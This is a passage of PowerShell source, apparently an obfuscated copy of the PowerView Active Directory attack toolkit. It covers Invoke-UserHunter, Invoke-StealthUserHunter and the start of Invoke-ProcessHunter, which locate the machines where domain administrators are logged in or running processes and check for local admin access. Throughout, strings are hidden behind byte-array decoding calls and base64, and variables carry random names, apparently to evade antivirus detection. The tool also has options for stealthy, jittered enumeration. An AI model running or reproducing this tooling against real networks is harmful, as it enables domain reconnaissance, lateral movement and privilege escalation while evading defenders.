        Write-Verbose (HandleResult95 @(107,36,41,127,147,122,122,26,85,142,127,123,13,60,190,90,117,93,65,159,95,123,90,127,149,80,117,8,107,176,85,111,53,88,177,86,117,22,77,199,95,111,45,98,150,106,35,31,108,197,90,99,35,102,195,0) @(61,22,111,15,247))

        $CcQndXrx = Get-Date

        # set a 60 second timeout for the scanning threads
        while ($($ht59LS | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $CcQndXrx).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }

        # end async call
        for ($mJAt = 0; $mJAt -lt $ypmBN; $mJAt++) {

            try {
                # complete async job
                $PS[$mJAt].EndInvoke($ht59LS[$mJAt])

            } catch {
                Write-Warning ((HandleResult95 @(243,103,246,187,131,54,224,9,245,131,220,56) @(169,63,188,194,225,5)) + $_)
            }
            finally {
                $PS[$mJAt].Dispose()
            }
        }
        
        $VqFs.Dispose()
        Write-Verbose (HandleResult95 @(39,195,108,223,12,131,101,25,247,121,250,45,145,127,59,243,77,158,124,191,84,49,236,120,200,2,157,92,63,197,41,145) @(118,148,20,172,69,203,55))
    }
}


function Invoke-UserHunter {
<#
    .SYNOPSIS

        Finds which machines users of a specified group are logged into.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroupMember or reads in a target user list, queries the domain for all
        active machines with Get-NetComputer or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSession/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Unconstrained

        Switch. Only enumerate computers that have unconstrained delegation.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserFile

        File of usernames to search for.

    .PARAMETER AdminCount

        Switch. Hunt for users with adminCount=1.

    .PARAMETER AllowDelegation

        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

    .PARAMETER StopOnSuccess

        Switch. Stop hunting after finding after finding a target user.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER CheckAccess

        Switch. Check if the current user has local admin access to found machines.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ShowAll

        Switch. Return all user location results, i.e. Invoke-UserView functionality.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Stealth

        Switch. Only enumerate sessions from connonly used target servers.

    .PARAMETER StealthSource

        The source of target servers to use, 'DFS' (distributed file servers),
        'DC' (domain controllers), 'File' (file servers), or 'All'

    .PARAMETER ForeignUsers

        Switch. Only return results that are not part of searched domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -CheckAccess

        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Domain 'testing'

        Finds machines on the 'testing' domain where domain admins are logged into.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Threads 20

        Multi-threaded user hunting, replaces Invoke-UserHunterThreaded.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -UserFile users.txt -ComputerFile hosts.txt

        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -GroupName "Power Users" -Delay 60

        Find machines on the domain where members of the "Power Users" groups are
        logged into with a 60 second (+/- *.3) randomized delay between
        touching each host.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -TargetServer FILESERVER

        Query FILESERVER for useres who are effective local administrators using
        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -SearchForest

        Find all machines in the current forest where domain admins are logged in.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Stealth

        Executes old Invoke-StealthUserHunter functionality, enumerating commonly
        used servers and checking just sessions for each.

    .LINK
        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $Unconstrained,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $AdminCount,

        [Switch]
        $AllowDelegation,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet((HandleResult95 @(158,242,211,24) @(204,183,137,76)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(HandleResult95 @(122,137,54,252,114,181,103,178) @(40,228,90,143)),(HandleResult95 @(231,50,225,255) @(182,101,153,140,148,78,214)))]
        $StealthSource =(HandleResult95 @(242,55,171,248) @(163,96,211,139,229,103,119,55)),

        [Switch]
        $ForeignUsers,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose ((HandleResult95 @(62,21,120,210,119,47,38,57,212,83,92,28,106,219,93,14,63,95,131,12,11,94,124,218,114,63,58,114,236,102,35,37,108,225,11,89,54,80,255,89,13,94,100,134,95,42,46,99,236,105,17,4,109,229,124,31,54,97,247,3) @(105,108,8,182,62)) + $Delay)

        if($Domain) {
            $ajPzEg = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $ajPzEg = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$ComputerName) { 
            [Array]$ComputerName = @()
            
            if($ComputerFile) {
                # if we're using a host list, read the targets in and add them to the target list
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($Stealth) {
                Write-Verbose (HandleResult95 @(110,211,103,221,98,183,77,129,90,163,119,197,89,210,103,221,114,179,119,247,89,142,99,197,97,184,127,217,95,167,89,196,97,153,119,219,89,210,4,197,89,210,0,194,94,179,119,128,88,210,99,218,114,168,123,221,88,142,111,221,88,142,120,140) @(59,224,53,177))
                Write-Verbose ((HandleResult95 @(90,101,254,227,45,64,136,95,110,21,238,245,22,36,166,22,86,100,249,185,61,86,205,82) @(15,86,172,143,116,23,240,111)) + $StealthSource)

                ForEach ($Domain in $ajPzEg) {
                    if (($StealthSource -eq (HandleResult95 @(209,185,192,14,217,133,145,64) @(131,212,172,125))) -or ($StealthSource -eq (HandleResult95 @(120,182,163,6) @(41,225,219,117)))) {
                        Write-Verbose ((HandleResult95 @(195,20,14,72,4,52,251,165,55,38,102,120,19,234,161,3,55,107,31,4,223,195,43,14,78,36,51,128) @(148,109,126,44,77,114,189)) + $Domain + (HandleResult95 @(84,243,148,49,126,221,140,0,124,227,182,43,84,242,128,43,126,218,148,43,126,218,131,50,81,221,250,122) @(29,180,206,71)))
                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq (HandleResult95 @(181,21,8,110) @(231,80,82,58))) -or ($StealthSource -eq (HandleResult95 @(116,37,221,22) @(37,114,165,101,122,118,252)))) {
                        Write-Verbose ((HandleResult95 @(101,6,122,16,71,116,57,59,46,86,120,74,107,35,59,92,54,77,38,120,80,40,76,4,108,91,62,55) @(50,127,10,116,14)) + $Domain + (HandleResult95 @(76,232,211,144,255,108,237,204,180,240,72,200,220,212,202,124,203,228,176,229,102,214,189,147,208,98,146,180) @(5,175,137,230,156)))
                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) -or ($StealthSource -eq (HandleResult95 @(3,206,211,112) @(82,153,171,3)))) {
                        Write-Verbose ((HandleResult95 @(15,181,67,225,115,23,30,253,105,221,112,100,57,155,6,235,115,22,10,186,81,210,124,33,58,165,114,184) @(88,204,51,133,58,81)) + $Domain + (HandleResult95 @(94,31,19,78,199,126,26,12,90,150,38,48,40,111,144,112,9,123,1,209,115,16,3,78,198,80,32,37,91,202,90,45,5,81,144,42) @(23,88,73,56,164)))
                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(29,150,186,158,199,167,205,37,16,183,128,207,239,182,190,122,3,168,152,140,236,182,205,100,40,134,139,199) @(74,239,202,250,142,225,139,20)) + $Domain + (HandleResult95 @(139,43,212,167,78,48,183,224,160,95,192,225,78,46,200,178) @(194,108,142,209,45,89,245,143)))

                    $GM6i = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }

                    $ComputerName += Get-NetComputer @GM6i
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(181,122,74,24,128,80,75,5,133,95,63,24,187,122,75,78,131,122,35,23) @(225,23,114,127))
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        # users we're going to be searching for
        $TargetUsers = @()

        # get the current user so we can ignore it in the results
        $CurrentUser = ([Environment]::UserName).toLower()

        # if we're showing all results, skip username enumeration
        if($ShowAll -or $ForeignUsers) {
            $m342PSR = New-Object PSObject
            $m342PSR | Add-Member Noteproperty 'MemberDomain' $Null
            $m342PSR | Add-Member Noteproperty 'MemberName' '*'
            $TargetUsers = @($m342PSR)

            if($ForeignUsers) {
                # if we're searching for user results not in the primary domain
                $xtIMUZXg = Convert-CanonicaltoNT4 -ObjectName ((HandleResult95 @(169,217,77,78,172,11,120,213,153,171,58,26) @(200,234,7,39,200,76,28,229)) + $($Domain))
                $DomainShortName = $xtIMUZXg.split("\")[0]
            }
        }
        # if we want to hunt for the effective domain users who can access a target server
        elseif($TargetServer) {
            Write-Verbose ((HandleResult95 @(158,56,127,105,16,165,12,89,103,30,168,7,77,66,53,178,58,27,83,67,130,40,103,105,16,165,58,69,102,26,138,14) @(203,96,41,5,115)) + $TargetServer + (HandleResult95 @(183,25,60,209,242,53,180,7,28,251,169,108,164,55,9,219,244,94,179,12,29,210,221,59) @(253,96,126,188,144,6)))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $m342PSR = New-Object PSObject
                $m342PSR | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $m342PSR | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $m342PSR
            }  | Where-Object {$_}
        }
        # if we get a specific username, only use that
        elseif($UserName) {
            Write-Verbose ((HandleResult95 @(125,172,99,148,142,223,124,175,114,167,242,247,99,157,65,152,164,244,78,185,119,179,133,168,73,231,69,137,142,218,73,232) @(42,213,19,240,199,153)) + $UserName + (HandleResult95 @(116,0,122,153,26,5,51,206) @(62,121,78,236,86,98,14,243)))
            $m342PSR = New-Object PSObject
            $m342PSR | Add-Member Noteproperty 'MemberDomain' $ajPzEg[0]
            $m342PSR | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($m342PSR)
        }
        # read in a target user list if we have one
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
                $m342PSR = New-Object PSObject
                $m342PSR | Add-Member Noteproperty 'MemberDomain' $ajPzEg[0]
                $m342PSR | Add-Member Noteproperty 'MemberName' $_
                $m342PSR
            }  | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $ajPzEg) {

                $GM6i = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = $AdminCount
                    'AllowDelegation' = $AllowDelegation
                }

                Write-Verbose ((HandleResult95 @(66,188,203,110,92,131,253,59,79,157,241,63,116,146,142,100,92,130,233,124,119,146,253,122,119,172,250,55) @(21,197,187,10)) + $Domain + (HandleResult95 @(4,79,175,14,20,36,74,196,27,69,27,113,150,15,74,112) @(77,8,245,120,119)))
                $TargetUsers += Get-NetUser @GM6i | ForEach-Object {
                    $m342PSR = New-Object PSObject
                    $m342PSR | Add-Member Noteproperty 'MemberDomain' $Domain
                    $m342PSR | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $m342PSR
                }  | Where-Object {$_}

            }            
        }
        else {
            ForEach ($Domain in $ajPzEg) {
                Write-Verbose ((HandleResult95 @(197,211,146,156,151,212,236,211,162,134,216,159,131,175,235,252,227,165,170,168,240,253,164,136,188,251,235,223) @(146,170,226,248,222)) + $Domain + (HandleResult95 @(42,137,56,150,122,28,92,82,173,80,182,96,22,103,33,184,56,137,91,27,125,14,247,83,131,90,52,112) @(99,206,98,224,25,117,30)) + $GroupName + "'")
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }

        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw (HandleResult95 @(212,192,100,36,24,121,182,207,107,8,7,70,217,225,104,58,24,123,217,207,70,23,100,87,202,241,112,54,24,116,205,213,123,24,27,86,226,250,96,45,51,15,202,209) @(131,185,34,64,81,60))
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)

            # optionally check if the server is up first
            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                if(!$DomainShortName) {
                    # if we're not searching for foreign users, check session information
                    $q3Xdk = Get-NetSession -ComputerName $ComputerName
                    ForEach ($JrxqcO0 in $q3Xdk) {
                        $UserName = $JrxqcO0.sesi10_username
                        $rXnmA = $JrxqcO0.sesi10_cname

                        if($rXnmA -and $rXnmA.StartsWith(([char]0x5c+[char]0x5c))) {
                            $rXnmA = $rXnmA.TrimStart("\")
                        }

                        # make sure we have a result
                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $RKpbjk = Get-IPAddress -ComputerName $ComputerName
                                $Rk5gx = New-Object PSObject
                                $Rk5gx | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                                $Rk5gx | Add-Member Noteproperty 'UserName' $UserName
                                $Rk5gx | Add-Member Noteproperty 'ComputerName' $ComputerName
                                $Rk5gx | Add-Member Noteproperty 'IP' $RKpbjk
                                $Rk5gx | Add-Member Noteproperty 'SessionFrom' $rXnmA

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess) {
                                    $Wv1EyQ = Invoke-CheckLocalAdminAccess -ComputerName $rXnmA
                                    $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Wv1EyQ
                                }
                                else {
                                    $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $Rk5gx
                            }
                        }                                    
                    }
                }
                if(!$Stealth) {
                    # if we're not 'stealthy', enumerate loggedon users as well
                    $gxXpvI1 = Get-NetLoggedon -ComputerName $ComputerName
                    ForEach ($m342PSR in $gxXpvI1) {
                        $UserName = $m342PSR.wkui1_username
                        # TODO: translate domain to authoratative name
                        #   then match domain name ?
                        $JrDg6EbO = $m342PSR.wkui1_logon_domain

                        # make sure wet have a result
                        if (($UserName) -and ($UserName.trim() -ne '')) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $VmL0JD = $True
                                if($DomainShortName) {
                                    if ($DomainShortName.ToLower() -ne $JrDg6EbO.ToLower()) {
                                        $VmL0JD = $True
                                    }
                                    else {
                                        $VmL0JD = $False
                                    }
                                }
                                if($VmL0JD) {
                                    $RKpbjk = Get-IPAddress -ComputerName $ComputerName
                                    $Rk5gx = New-Object PSObject
                                    $Rk5gx | Add-Member Noteproperty 'UserDomain' $JrDg6EbO
                                    $Rk5gx | Add-Member Noteproperty 'UserName' $UserName
                                    $Rk5gx | Add-Member Noteproperty 'ComputerName' $ComputerName
                                    $Rk5gx | Add-Member Noteproperty 'IP' $RKpbjk
                                    $Rk5gx | Add-Member Noteproperty 'SessionFrom' $Null

                                    # see if we're checking to see if we have local admin access on this machine
                                    if ($CheckAccess) {
                                        $Wv1EyQ = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                                        $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Wv1EyQ
                                    }
                                    else {
                                        $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $Rk5gx
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(119,192,89,40,3,171,206,70,252,80,48,24,156,250,103,243,118,15,84,168,228,105,252,103,60,38,161,202,69,223,127,33,59,145,235,74,251,110,25,88,143,236,28,165) @(33,152,23,88,97,198,173)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'DomainShortName' = $DomainShortName
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(237,228,135,59,128,180,150,192,222,218,177,44,128,181,241,135,216,202,189,51,170,155,134,192,224,244,181,55,144,193,150,198,222,240,162,56,168,181,253,204,222,213,186,105,128,179,249,139) @(186,157,247,95,201,242,196,182)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(214,13,30,47,49,184,215,1,10,28,73,145,226,25,40,123,25,170,180,26,39,3,54,145,226,26,52,39,27,148,192,73) @(129,116,110,75,120,253)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(229,215,236,114,229,209,232,34) @(172,144,213,31)) + $($ComputerName.count) + ")")
                $e9hz = Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
                $e9hz

                if($e9hz -and $StopOnSuccess) {
                    Write-Verbose (HandleResult95 @(107,116,160,41,155,87,110,101,179,32,182,125,88,78,146,124,177,35,106,116,153,10,136,103,88,90,229,38,158,82,126,116,138,21,128,32,95,96,229,61,176,124,95,106,138,26,148,104,94,69,187,112) @(60,13,208,77,210,17))
                    return
                }
            }
        }

    }
}


function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [String]
        [ValidateSet((HandleResult95 @(12,151,226,52) @(94,210,184,96,196)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(HandleResult95 @(132,86,110,144,223,184,186,217) @(214,59,2,227,133,233,135,228)),(HandleResult95 @(133,145,39,95) @(212,198,95,44,149,230,29,193)))]
        $StealthSource =(HandleResult95 @(194,161,122,252) @(147,246,2,143,34))
    )
    # kick off Invoke-UserHunter with stealth options
    Invoke-UserHunter -Stealth @PSBoundParameters
}


function Invoke-ProcessHunter {
<#
    .SYNOPSIS

        Query the process lists of remote machines, searching for
        processes with a specific name or owned by a specific user.
        Thanks to @paulbrandau for the approach idea.
        
        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ProcessName

        The name of the process to hunt, or a comma separated list of names.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserFile

        File of usernames to search for.

    .PARAMETER RemoteUserName

        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

    .PARAMETER RemotePassword

        The password to use for the WMI call on a remote system.

    .PARAMETER StopOnSuccess

        Switch. Stop hunting after finding after finding a target user/process.

    .PARAMETER NoPing

        Switch. Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ShowAll

        Switch. Return all user location results.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -Domain 'testing'
        
        Finds machines on the 'testing' domain where domain admins have a
        running process.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -Threads 20

        Multi-threaded process hunting, replaces Invoke-ProcessHunterThreaded.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -UserFile users.txt -ComputerFile hosts.txt
        
        Finds machines in hosts.txt where any members of users.txt have running
        processes.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -GroupName "Power Users" -Delay 60
        
        Find machines on the domain where members of the "Power Users" groups have
        running processes with a 60 second (+/- *.3) randomized delay between
        touching each host.

    .LINK

        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose ((HandleResult95 @(250,11,93,96,222,169,231,67,79,105,162,159,207,31,78,99,196,184,152,64,79,54,227,131,225,36,111,125,245,221,227,30,78,55,217,166,201,37,24,52,205,183,228,21,73,54,251,223,204,49,111,111,205,184,213,26,72,87,213,153,247,27,108,57) @(173,114,45,4,151,239)) + $Delay)

        if($Domain) {
            $ajPzEg = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $ajPzEg = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$ComputerName) { 
            # if we're using a host list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(185,110,62,162,81,191,205,223,77,22,140,45,152,220,219,121,7,129,74,143,233,185,81,62,164,113,184,182) @(238,23,78,198,24,249,139)) + $Domain + (HandleResult95 @(107,20,106,123,126,145,20,136,64,96,126,61,126,143,107,218) @(34,83,48,13,29,248,86,231)))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(217,30,74,99,47,202,74,8,96,6,192,20,40,105,119,188,17,31,85,38) @(141,115,114,4,78))
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        if(!$ProcessName) {
            Write-Verbose (HandleResult95 @(70,29,31,251,195,29,155,100,41,21,202,218,54,168,80,5,126,203,145,57,152,90,62,80,198,247,27,161,72,29,75,240,250,22,166,117,41,73,202,208,55,150,64,0,69,241,195,50,136,65,50,23,197,248,31,191,72,40,118,251,196,13,159,126,19,78,222,218,15,137,67,77) @(18,112,39,156,160,85,209))

            # users we're going to be searching for
            $TargetUsers = @()

            # if we want to hunt for the effective domain users who can access a target server
            if($TargetServer) {
                Write-Verbose ((HandleResult95 @(246,120,112,96,176,250,254,211,66,75,111,180,240,213,229,89,124,62,133,164,219,235,110,74,111,189,206,254,192,73,103,98) @(163,32,38,12,211,148,146)) + $TargetServer + (HandleResult95 @(115,58,73,48,5,10,10,108,63,32,0,41,82,10,16,94,39,83,19,11,90,45,70,96) @(57,67,11,93,103)))
                $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }
            # if we get a specific username, only use that
            elseif($UserName) {
                Write-Verbose ((HandleResult95 @(27,203,32,143,30,117,26,200,49,188,98,93,5,250,2,131,52,94,40,222,52,168,21,2,47,128,6,146,30,112,47,143) @(76,178,80,235,87,51)) + $UserName + (HandleResult95 @(119,137,2,112,63,139,148,0) @(61,240,54,5,115,236,169)))
                $TargetUsers = @( $UserName.ToLower() )
            }
            # read in a target user list if we have one
            elseif($UserFile) {
                $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $ajPzEg) {
